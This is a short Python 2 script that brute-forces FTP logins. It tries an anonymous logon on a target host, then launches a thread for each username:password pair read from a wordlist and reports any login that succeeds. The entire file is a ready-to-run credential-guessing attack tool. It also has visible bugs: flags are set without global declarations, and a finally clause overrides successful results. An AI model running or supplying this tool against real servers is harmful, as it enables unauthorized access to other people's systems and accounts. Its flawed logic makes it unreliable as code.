#!/usr/bin/env python
# encoding: utf-8
# author: Lock
# time: 2016/11/13 21:35


import ftplib
import optparse
import time
import threading

Found = False
thLock = threading.Semaphore(value=1)
TestAnonLogin = True

def anon_login(hostname):
    TestAnonLogin = False
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'lock')
        print('\n[*] ' + str(hostname) + ' FTP AnonymousLogon Succeeded.')
        ftp.quit()
        exit(0)
    except Exception as e:
        print('\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.')

def print_msg(msg):
        thLock.acquire()
        print msg
        thLock.release()

def brute_login(hostname, userName, passWord,time_delay):
    
    time.sleep(time_delay)
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(userName, passWord)
        msg = '\n[*] ' + str(hostname) + ' FTP LogonSucceeded: ' + userName + '/' + passWord
        print_msg(msg)
        ftp.quit()
        Found = True
        return (userName, passWord)
    except Exception, e:
        pass
    finally:
        msg = '\n[-] Could not brute force FTP credentials.username is:%s'%(userName,)
        print_msg(msg)
        return (None, None)


def run():
    parser = optparse.OptionParser('usage: ' + '-H <target host> -f <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-f', dest='passwdFile', type='string',
                      help='specify password file,like username:password format file')
    parser.add_option('-d',dest='delay',type='int',help='attack time delay set default 1s',default=1)
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    time_delay = options.delay
    if host == None or passwdFile == None:
        print(parser.usage)
        exit(0)
    if TestAnonLogin:
        anon_login(host)
    with open(passwdFile, 'r') as fp:
        if Found:
            print "[*] Exiting: Key Found"
            exit(0)
        for line in fp.readlines():
            userName = line.split(':')[0]
            passWord = line.split(':')[1].strip('\r').strip('\n')
            print '[+] Trying: ' + userName + '/' + passWord
            t = threading.Thread(target=brute_login, args=(host, userName, passWord,time_delay))
            t.start()


if __name__ == '__main__':
    run()
